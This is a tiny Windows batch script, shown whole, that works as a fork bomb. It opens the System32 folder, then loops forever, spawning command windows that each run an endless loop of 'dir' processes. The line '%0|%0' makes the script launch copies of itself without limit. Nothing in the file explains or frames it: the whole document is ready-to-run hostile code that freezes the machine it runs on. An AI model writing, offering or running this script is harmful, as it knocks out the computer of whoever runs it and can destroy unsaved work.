@echo off

start C:\Windows\System32

:x
start cmd /k  {for /l %%x in (1,0,2) do (start /wait dir)}

%0|%0

goto x